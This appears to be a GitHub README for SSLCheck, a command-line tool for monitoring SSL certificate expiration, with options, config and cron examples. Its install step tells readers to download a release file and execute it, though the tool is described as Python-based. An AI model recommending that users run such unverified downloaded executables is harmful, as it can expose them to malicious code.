# SSLCheck: Monitor SSL Certificate Expiration Easily 🔒🌐

![SSLCheck](https://img.shields.io/badge/SSLCheck-CLI-blue?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.8%2B-yellowgreen?style=flat-square) ![DevOps](https://img.shields.io/badge/DevOps-Tools-orange?style=flat-square) 

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Command-Line Options](#command-line-options)
- [Examples](#examples)
- [Monitoring](#monitoring)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Overview

SSLCheck is a command-line tool designed to check and monitor SSL certificate expiration across multiple domains. It provides a straightforward way to ensure your websites maintain secure connections by alerting you before certificates expire.

## Features

- **Multi-Domain Support**: Check SSL certificates for multiple domains at once.
- **Expiration Alerts**: Get notified when certificates are about to expire.
- **Easy to Use**: Simple command-line interface for quick checks.
- **Python-Based**: Built with Python, making it easy to extend and customize.
- **DevOps Friendly**: Integrates well into CI/CD pipelines and automation scripts.

## Installation

To install SSLCheck, you can download the latest release from the [Releases section](https://github.com/Redaghafir/sslcheck/releases). Once downloaded, execute the file to install the tool.

```bash
# Example command to execute after downloading
chmod +x sslcheck
./sslcheck
```

## Usage

After installation, you can use SSLCheck directly from your command line. The basic command structure is as follows:

```bash
sslcheck [options] [domain1 domain2 ...]
```

## Configuration

SSLCheck allows you to configure certain parameters to tailor its functionality to your needs. You can set default domains and alert thresholds through a configuration file or command-line options.

### Configuration File

Create a configuration file named `sslcheck.conf` in your home directory. This file can include default domains and notification settings.

Example `sslcheck.conf`:

```ini
[DEFAULT]
domains = example.com, example.org
alert_days = 30
```

## Command-Line Options

SSLCheck comes with several command-line options to enhance its usability:

- `-h`, `--help`: Show help message and exit.
- `-c`, `--config`: Specify a custom configuration file.
- `-d`, `--domains`: List of domains to check.
- `-a`, `--alert`: Set the number of days before expiration to alert.

## Examples

Here are some examples of how to use SSLCheck effectively.

### Check a Single Domain

To check a single domain, run:

```bash
sslcheck -d example.com
```

### Check Multiple Domains

To check multiple domains, use:

```bash
sslcheck -d example.com example.org
```

### Use Configuration File

If you have set up a configuration file, simply run:

```bash
sslcheck
```

This will use the domains specified in the `sslcheck.conf`.

## Monitoring

For ongoing monitoring, consider integrating SSLCheck into a cron job. This way, you can regularly check your domains without manual intervention.

### Example Cron Job

To set up a cron job that runs SSLCheck daily at 2 AM, you can add the following line to your crontab:

```bash
0 2 * * * /path/to/sslcheck -d example.com >> /var/log/sslcheck.log
```

## Contributing

Contributions are welcome! If you want to improve SSLCheck, please fork the repository and submit a pull request. Here are some ways you can contribute:

- Report bugs or issues.
- Suggest new features.
- Improve documentation.
- Write tests.

## License

SSLCheck is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Links

For more information, visit the [Releases section](https://github.com/Redaghafir/sslcheck/releases) to download the latest version of SSLCheck. This tool is designed to help you maintain the security of your domains effortlessly. 

You can also check out the source code and contribute on [GitHub](https://github.com/Redaghafir/sslcheck). 

### Additional Resources

- [Python Documentation](https://docs.python.org/3/)
- [DevOps Tools](https://www.devops.com/)
- [SSL Certificate Best Practices](https://www.ssl.com/article/ssl-certificate-best-practices/)

![SSL Certificate](https://www.ssl.com/wp-content/uploads/2020/03/ssl-certificate.png)

SSLCheck aims to simplify the process of managing SSL certificates, ensuring that your online presence remains secure and reliable.